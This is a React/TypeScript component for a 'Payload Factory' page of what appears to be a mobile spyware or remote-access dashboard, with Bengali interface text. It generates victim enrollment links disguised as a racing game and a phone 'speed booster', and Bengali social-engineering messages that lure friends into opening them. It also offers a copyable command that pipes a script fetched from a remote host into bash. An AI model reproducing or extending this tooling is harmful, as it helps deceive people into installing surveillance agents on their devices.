
import React, { useState, useEffect } from 'react';

const SetupGuide: React.FC = () => {
  const [activeTab, setActiveTab] = useState<'link' | 'pin' | 'cli' | 'social' | 'decoy'>('decoy');
  const [pairingCode] = useState(() => Math.random().toString(10).substring(2, 8));
  const [baseUrl, setBaseUrl] = useState('');
  const [copied, setCopied] = useState(false);

  const cliPayload = `curl -sSL nexus-core.io/agent | bash -s -- --id NX-${pairingCode} --key ${pairingCode}`;

  useEffect(() => {
    // Priority: LocalStorage Public URL > Current URL
    const savedPublicUrl = localStorage.getItem('nexus_public_url');
    if (savedPublicUrl && savedPublicUrl.startsWith('http')) {
      let cleanUrl = savedPublicUrl;
      if (!cleanUrl.endsWith('/')) cleanUrl += '/';
      setBaseUrl(cleanUrl);
    } else {
      const protocol = window.location.protocol;
      const host = window.location.host;
      let path = window.location.pathname;
      if (!path.endsWith('/')) path += '/';
      setBaseUrl(`${protocol}//${host}${path}`);
    }
  }, []);

  const copyText = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  const enrollmentLink = `${baseUrl}#/enroll/NX-${pairingCode}?key=${pairingCode}`;
  const gameLink = `${enrollmentLink}&theme=game`;
  const boosterLink = `${enrollmentLink}&theme=booster`;

  return (
    <div className="max-w-4xl mx-auto space-y-6 animate-in fade-in duration-700 px-1 md:px-0 pb-20">
      <header className="text-center space-y-2">
        <div className="inline-flex items-center gap-2 px-3 py-1 bg-blue-600/10 border border-blue-500/20 rounded-full text-[9px] font-black text-blue-400 uppercase tracking-[0.1em]">
          Deployment Hub v15.5
        </div>
        <h1 className="text-3xl md:text-4xl font-black text-white italic leading-tight">PAYLOAD <span className="text-blue-500">FACTORY</span></h1>
        <p className="text-gray-500 text-[10px] italic">লিঙ্ক অন্য ফোনে কাজ না করলে <a href="#/settings" className="text-blue-500 underline">Settings</a> এ পাবলিক URL সেট করুন।</p>
      </header>

      {/* Warning for Private Preview */}
      {!localStorage.getItem('nexus_public_url') && (
        <div className="p-3 bg-red-600/10 border border-red-500/20 rounded-xl flex items-center gap-3">
          <i className="fas fa-circle-exclamation text-red-500 text-xs"></i>
          <p className="text-[9px] text-red-400 font-bold uppercase tracking-wider leading-tight">
            সতর্কতা: আপনি বর্তমানে প্রাইভেট লিঙ্ক ব্যবহার করছেন। এটি অন্য ফোনে কাজ করবে না। সেটিংস এ গিয়ে পাবলিক URL সেট করুন।
          </p>
        </div>
      )}

      {/* Tabs */}
      <div className="flex bg-gray-900/50 p-1 rounded-2xl border border-white/5 overflow-x-auto no-scrollbar scroll-smooth">
        {[
          { id: 'decoy', icon: 'fa-gamepad', label: 'Decoy' },
          { id: 'pin', icon: 'fa-key', label: 'PIN' },
          { id: 'cli', icon: 'fa-terminal', label: 'CLI' },
          { id: 'social', icon: 'fa-comment-alt', label: 'Templates' },
        ].map((tab) => (
          <button
            key={tab.id}
            onClick={() => setActiveTab(tab.id as any)}
            className={`flex-1 flex items-center justify-center gap-2 py-2.5 px-4 rounded-xl text-[10px] font-bold uppercase tracking-widest transition-all whitespace-nowrap min-w-[100px] ${
              activeTab === tab.id ? 'bg-blue-600 text-white shadow-lg' : 'text-gray-500 hover:text-gray-300'
            }`}
          >
            <i className={`fas ${tab.icon} text-xs`}></i>
            {tab.label}
          </button>
        ))}
      </div>

      <div className="min-h-[350px]">
        {/* Decoy Method */}
        {activeTab === 'decoy' && (
          <div className="space-y-4 animate-in slide-in-from-bottom duration-400">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
              {/* Game Decoy */}
              <div className="glass rounded-[32px] p-6 border border-orange-500/20 bg-gradient-to-br from-orange-600/5 to-transparent flex flex-col justify-between">
                <div className="space-y-4">
                  <div className="w-12 h-12 bg-orange-600 rounded-2xl flex items-center justify-center text-white shadow-lg shadow-orange-600/20">
                    <i className="fas fa-car-side text-xl"></i>
                  </div>
                  <div>
                    <h3 className="text-lg font-black text-white italic">Turbo Gadi Game</h3>
                    <p className="text-[10px] text-gray-500 uppercase font-bold tracking-widest">Racing Theme</p>
                  </div>
                  <p className="text-[10px] text-gray-400 italic leading-relaxed line-clamp-2">
                    ভিকটিম লিঙ্কে ঢুকলে একটি গাড়ি গেমের লোডিং স্ক্রিন দেখবে।
                  </p>
                </div>
                <div className="mt-6 space-y-2">
                   <p className="text-[8px] text-gray-600 font-mono truncate">{gameLink}</p>
                   <button 
                    onClick={() => copyText(gameLink)}
                    className="w-full py-4 bg-orange-600 hover:bg-orange-500 text-white rounded-2xl text-[10px] font-black uppercase tracking-widest transition-all active:scale-95"
                  >
                    {copied ? 'Copied!' : 'Copy Game Link'}
                  </button>
                </div>
              </div>

              {/* Booster Decoy */}
              <div className="glass rounded-[32px] p-6 border border-green-500/20 bg-gradient-to-br from-green-600/5 to-transparent flex flex-col justify-between">
                <div className="space-y-4">
                  <div className="w-12 h-12 bg-green-600 rounded-2xl flex items-center justify-center text-white shadow-lg shadow-green-600/20">
                    <i className="fas fa-rocket text-xl"></i>
                  </div>
                  <div>
                    <h3 className="text-lg font-black text-white italic">Speed Booster Pro</h3>
                    <p className="text-[10px] text-gray-500 uppercase font-bold tracking-widest">System Tool</p>
                  </div>
                  <p className="text-[10px] text-gray-400 italic leading-relaxed line-clamp-2">
                    যাদের ফোন স্লো, তাদের এই লিঙ্ক দিন।
                  </p>
                </div>
                <div className="mt-6 space-y-2">
                   <p className="text-[8px] text-gray-600 font-mono truncate">{boosterLink}</p>
                   <button 
                    onClick={() => copyText(boosterLink)}
                    className="w-full py-4 bg-green-600 hover:bg-green-500 text-white rounded-2xl text-[10px] font-black uppercase tracking-widest transition-all active:scale-95"
                  >
                     {copied ? 'Copied!' : 'Copy Booster Link'}
                  </button>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* PIN Method */}
        {activeTab === 'pin' && (
          <div className="glass rounded-[32px] p-6 md:p-8 border border-blue-500/20 space-y-6 animate-in zoom-in duration-300">
            <div className="text-center space-y-1">
              <h2 className="text-lg font-bold text-white uppercase italic">Ghost PIN</h2>
              <p className="text-[10px] text-gray-500">সিকিউরিটি পিন হিসেবে ব্যবহার করুন।</p>
            </div>
            <div className="flex justify-center">
              <div className="bg-black/60 px-6 py-5 rounded-3xl border border-blue-500/30 flex items-center justify-center gap-2">
                {pairingCode.split('').map((num, i) => (
                  <span key={i} className="text-3xl font-black text-blue-500 font-mono">{num}</span>
                ))}
              </div>
            </div>
            <button onClick={() => copyText(pairingCode)} className="w-full py-4 bg-white/5 text-white rounded-2xl text-[10px] font-bold uppercase tracking-widest border border-white/10">Copy PIN</button>
          </div>
        )}

        {/* CLI */}
        {activeTab === 'cli' && (
          <div className="glass rounded-[32px] p-6 border border-white/5 space-y-4 animate-in slide-in-from-right">
            <code className="text-[10px] text-blue-300 break-all bg-black/80 p-4 rounded-xl block">{cliPayload}</code>
            <button onClick={() => copyText(cliPayload)} className="w-full py-4 bg-gray-800 text-white rounded-2xl text-[10px] font-bold uppercase tracking-widest">Copy Payload</button>
          </div>
        )}

        {activeTab === 'social' && (
          <div className="space-y-3 animate-in fade-in">
            <div className="glass p-4 rounded-2xl border border-white/5 cursor-pointer" onClick={() => copyText(`Turbo Racer গেমটা ট্রাই কর, গ্রাফিক্স সেই হইছে: ${gameLink}`)}>
               <p className="text-[10px] text-gray-400 italic">"Turbo Racer গেমটা ট্রাই কর, গ্রাফিক্স সেই হইছে: {gameLink.substring(0,30)}..."</p>
            </div>
            <div className="glass p-4 rounded-2xl border border-white/5 cursor-pointer" onClick={() => copyText(`তোর ফোন তো স্লো, এই বুস্টারটা দিয়ে ক্লিন কর: ${boosterLink}`)}>
               <p className="text-[10px] text-gray-400 italic">"তোর ফোন তো স্লো, এই বুস্টারটা দিয়ে ক্লিন কর: {boosterLink.substring(0,30)}..."</p>
            </div>
          </div>
        )}
      </div>

      <div className="p-4 bg-indigo-600/5 border border-indigo-500/10 rounded-2xl flex items-center gap-3">
        <i className="fas fa-circle-info text-indigo-400"></i>
        <p className="text-[9px] text-gray-500 leading-tight italic">
          <b>সংশোধন:</b> লিঙ্ক অন্য ফোনে কাজ না করলে ড্যাশবোর্ডের <b>Settings</b> এ গিয়ে একটি পাবলিক ডোমেইন বা টানেল লিঙ্ক সেট করে নিন।
        </p>
      </div>
    </div>
  );
};

export default SetupGuide;
